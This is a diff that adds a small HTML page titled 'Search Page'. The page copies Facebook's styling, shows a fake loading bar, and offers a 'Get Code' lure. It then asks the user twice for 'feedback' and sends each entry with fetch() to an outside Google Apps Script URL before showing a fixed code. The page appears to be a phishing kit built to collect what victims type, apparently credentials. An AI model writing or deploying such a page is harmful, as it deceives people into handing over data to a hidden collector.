@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Search Page</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Helvetica, Arial, sans-serif;
+  background:#f0f2f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.box{
+  background:#fff;
+  width:360px;
+  padding:20px;
+  border-radius:8px;
+  box-shadow:0 2px 10px rgba(0,0,0,.15);
+  text-align:center;
+}
+
+/* Facebook-like input */
+.fb-input{
+  width:100%;
+  height:44px;
+  padding:0 12px;
+  font-size:15px;
+  border-radius:6px;
+  border:1px solid #ccd0d5;
+  margin:10px 0;
+}
+
+button{
+  width:100%;
+  height:44px;
+  border:none;
+  border-radius:6px;
+  background:#1877f2;
+  color:#fff;
+  font-size:15px;
+  cursor:pointer;
+}
+
+.link{
+  color:#1877f2;
+  margin-top:10px;
+  cursor:pointer;
+  font-size:14px;
+}
+
+.hidden{display:none}
+
+/* Loading */
+.loading{
+  width:100%;
+  background:#ddd;
+  border-radius:6px;
+  overflow:hidden;
+}
+.bar{
+  height:20px;
+  width:0%;
+  background:#1877f2;
+}
+</style>
+</head>
+
+<body>
+
+<!-- PAGE 1 SEARCH -->
+<div class="box" id="page1">
+  <h3>Search</h3>
+  <div class="loading"><div class="bar" id="bar"></div></div>
+  <p id="percent">0%</p>
+</div>
+
+<!-- PAGE 2 ENTER CODE -->
+<div class="box hidden" id="codePage">
+  <h3>Enter Code</h3>
+  <input class="fb-input" placeholder="Enter Code">
+  <button>Submit</button>
+  <div class="link" onclick="getCode()">Don't have a Code? Get Code</div>
+</div>
+
+<!-- FEEDBACK 1 -->
+<div class="box hidden" id="fb1">
+  <h3>Feedback</h3>
+  <input class="fb-input" id="f1" placeholder="Enter feedback">
+  <button onclick="sendF1()">Send</button>
+</div>
+
+<!-- FEEDBACK 2 -->
+<div class="box hidden" id="fb2">
+  <h3>More Feedback</h3>
+  <input class="fb-input" id="f2" placeholder="Enter feedback">
+  <button onclick="sendF2()">Send</button>
+</div>
+
+<!-- CODE SHOW -->
+<div class="box hidden" id="codeShow">
+  <h2>CODE</h2>
+  <h1>5864</h1>
+  <button onclick="copyCode()">COPY</button>
+  <div class="link" onclick="backMain()">Back to main</div>
+</div>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxPZco9av6RzXCesIXIByfVHRHdhhqmDD8_UaeAb6R1akmK9jPhCvQrRZpRqy47bqUCPw/exec";
+
+/* LOADING 11 SECONDS */
+let p=0;
+let loading=setInterval(()=>{
+  p++;
+  bar.style.width=p+"%";
+  percent.innerText=p+"%";
+  if(p>=100){
+    clearInterval(loading);
+    page1.classList.add("hidden");
+    codePage.classList.remove("hidden");
+  }
+},110); // ≈11 seconds
+
+function getCode(){
+  codePage.classList.add("hidden");
+  fb1.classList.remove("hidden");
+}
+
+function sendF1(){
+  const v=document.getElementById("f1").value;
+  fetch(WEB_APP_URL+"?step=1&feedback="+encodeURIComponent(v));
+  fb1.classList.add("hidden");
+  fb2.classList.remove("hidden");
+}
+
+function sendF2(){
+  const v=document.getElementById("f2").value;
+  fetch(WEB_APP_URL+"?step=2&feedback="+encodeURIComponent(v));
+  fb2.classList.add("hidden");
+  codeShow.classList.remove("hidden");
+}
+
+function copyCode(){
+  navigator.clipboard.writeText("5864");
+  alert("Code Copied");
+}
+
+function backMain(){
+  codeShow.classList.add("hidden");
+  codePage.classList.remove("hidden");
+}
+</script>
+
+</body>
+</html>
